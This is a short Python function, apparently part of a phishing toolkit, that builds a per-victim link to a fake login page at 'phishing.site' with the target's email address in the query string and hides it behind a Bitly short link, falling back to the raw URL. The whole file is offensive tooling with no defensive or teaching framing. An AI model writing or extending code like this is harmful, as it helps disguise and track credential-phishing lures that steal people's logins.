import requests
from config import BITLY_API_KEY

def create_tracking_link(target_email):
    if BITLY_API_KEY:
        url = "https://api-ssl.bitly.com/v4/shorten"
        headers = {"Authorization": f"Bearer {BITLY_API_KEY}"}
        payload = {"long_url": f"http://phishing.site/login?email={target_email}"}
        try:
            resp = requests.post(url, json=payload, headers=headers, timeout=10)
            if resp.status_code == 200:
                return resp.json().get('link')
        except:
            pass
    # Fallback
    return f"http://phishing.site/login?email={target_email}"
